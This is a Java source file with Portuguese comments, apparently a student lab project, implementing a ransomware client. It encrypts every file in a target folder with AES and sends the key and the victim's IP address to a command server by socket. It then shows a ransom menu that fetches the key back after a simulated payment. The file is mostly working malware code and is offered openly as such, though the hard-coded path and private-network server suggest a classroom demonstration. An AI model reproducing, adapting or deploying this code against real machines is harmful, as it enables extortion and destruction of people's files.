import javax.crypto.Cipher;
import javax.crypto.KeyGenerator;
import javax.crypto.SecretKey;
import javax.crypto.spec.SecretKeySpec;
import java.io.*;
import java.net.InetAddress;
import java.net.Socket;
import java.nio.file.*;
import java.security.NoSuchAlgorithmException;
import java.util.Base64;
import java.util.Scanner;

/**
 * Classe que representa o cliente/vítima que sofre a encriptação de uma pasta.
 * @author Diogo Matos & Henrique Rosa
 */
public class Client {
    // Endereço IP do servidor
    private static final String SERVER_IP = "10.70.10.104";
    // Porta do servidor
    private static final int SERVER_PORT = 12345;
    // Caminho da pasta a ser encriptada e desencriptada
    private static final String FOLDER_PATH = "C:\\Users\\diogo\\Desktop\\FolderCrypt";
    // Identificador do cliente baseado no IP
    private static final String CLIENT_ID;
    // Chave de encriptação
    private static String encryptionKey;
    // Flag indicando se a pasta está desencriptada
    private static boolean decryptedFolder = false;

    static {
        try {
            CLIENT_ID = InetAddress.getLocalHost().getHostAddress();
        } catch (IOException e) {
            throw new RuntimeException("Não foi possível obter o endereço IP.", e);
        }
    }

    /**
     * Método principal.
     */
    public static void main(String[] args) throws Exception {
        // Encripta a pasta e envia a chave para o servidor
        if(!isFolderEncrypted()){
            encryptFolder();
            sendEncryptionKey();
        }


        Scanner scanner = new Scanner(System.in);
        while (true) {
            // Se a pasta estiver desencriptografada, mostra uma mensagem e sai do loop
            if (decryptedFolder) {
                System.out.println("Pasta desencriptada.");
                break;
            }
            System.out.println("A sua pasta está encriptada.");
            System.out.println("1. Pagar para desencriptar");
            System.out.println("2. Sair");
            System.out.print("Escolha uma opção: ");
            int choice = scanner.nextInt();

            switch (choice) {
                case 1:
                    simulatePaymentAndDecrypt();
                    break;
                case 2:
                    System.out.println("Saindo...");
                    System.exit(0);
                    break;
                default:
                    System.out.println("Opção inválida.");
            }
        }
    }

    /**
     * Encripta todos os ficheiros na pasta especificada.
     * @throws Exception Exceção lançada em caso de erros
     */
    private static void encryptFolder() throws Exception {
        SecretKey secretKey = generateSecretKey();
        encryptionKey = Base64.getEncoder().encodeToString(secretKey.getEncoded());
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.ENCRYPT_MODE, secretKey);

        // Percorre todos os ficheiros na pasta e os encripta
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(Paths.get(FOLDER_PATH))) {
            for (Path filePath : stream) {
                if (Files.isRegularFile(filePath)) {
                    try {
                        byte[] fileBytes = Files.readAllBytes(filePath);
                        byte[] encryptedBytes = cipher.doFinal(fileBytes);
                        Files.write(filePath, encryptedBytes);
                        System.out.println("Ficheiro encriptado: " + filePath);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
        System.out.println("Pasta encriptada.");
    }


    /**
     * Verifica se a pasta já está encriptada.
     * @return true se a pasta estiver encriptada, false caso contrário
     */
    private static boolean isFolderEncrypted() {
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(Paths.get(FOLDER_PATH))) {
            for (Path filePath : stream) {
                if (Files.isRegularFile(filePath)) {
                    byte[] fileBytes = Files.readAllBytes(filePath);
                    // Verifica se os primeiros bytes são legíveis ou correspondem a um padrão esperado
                    if (fileBytes.length > 0 && !isLegit(fileBytes)) {
                        return false;
                    }
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return true;
    }

    /**
     * Verifica se os bytes provavelmente estão encriptados.
     * @param bytes Os bytes do arquivo
     * @return true se os bytes provavelmente estiverem encriptados, false caso contrário
     */
    private static boolean isLegit(byte[] bytes) {
        for (byte b : bytes) {
            if (b < 32 || b > 126) { // Se o byte não é um caracter ASCII legível
                return true;
            }
        }
        return false;
    }


    /**
     * Envia a chave para o servidor.
     */
    private static void sendEncryptionKey() {
        try (Socket socket = new Socket(SERVER_IP, SERVER_PORT);
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {
            out.println(CLIENT_ID);
            out.println("ENCRYPT");
            out.println(encryptionKey);
            System.out.println("Chave enviada para o servidor.");
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Simula o pagamento e desencripta a pasta.
     * @throws Exception Exceção lançada em caso de erros
     */
    private static void simulatePaymentAndDecrypt() throws Exception {
        String decryptionKey = requestDecryptionKey();
        if (decryptionKey != null) {
            byte[] decodedKey = Base64.getDecoder().decode(decryptionKey);
            SecretKeySpec secretKey = new SecretKeySpec(decodedKey, 0, decodedKey.length, "AES");
            decryptFolder(secretKey);
            decryptedFolder = true;
        } else {
            System.out.println("Falha ao recuperar a chave de desencriptação.");
        }
    }

    /**
     * Solicita a chave para desencriptar ao servidor.
     * @return Chave para desencriptar recebida
     */
    private static String requestDecryptionKey() {
        try (Socket socket = new Socket(SERVER_IP, SERVER_PORT);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true)) {
            out.println(CLIENT_ID);
            out.println("PAGAR");
            String key = in.readLine();
            System.out.println("Chave recebida: " + key);
            return key;
        } catch (IOException e) {
            e.printStackTrace();
            return null;
        }
    }

    /**
     * Desencripta todos os ficheiros na pasta especificada.
     * @param key Chave para desencriptar
     * @throws Exception Exceção lançada em caso de erros
     */
    private static void decryptFolder(SecretKeySpec key) throws Exception {
        Cipher cipher = Cipher.getInstance("AES");
        cipher.init(Cipher.DECRYPT_MODE, key);

        // Percorre todos os ficheiros na pasta e os desencripta
        try (DirectoryStream<Path> stream = Files.newDirectoryStream(Paths.get(FOLDER_PATH))) {
            for (Path filePath : stream) {
                if (Files.isRegularFile(filePath)) {
                    try {
                        byte[] fileBytes = Files.readAllBytes(filePath);
                        byte[] decryptedBytes = cipher.doFinal(fileBytes);
                        Files.write(filePath, decryptedBytes);
                        System.out.println("Ficheiro desencriptado: " + filePath);
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }
            }
        }
    }

    /**
     * Gera uma chave AES.
     * @return Chave de Encriptação gerada
     * @throws NoSuchAlgorithmException Exceção lançada se o algoritmo de Encriptação não for encontrado
     */
    private static SecretKey generateSecretKey() throws NoSuchAlgorithmException {
        KeyGenerator keyGen = KeyGenerator.getInstance("AES");
        keyGen.init(128);
        return keyGen.generateKey();
    }
}
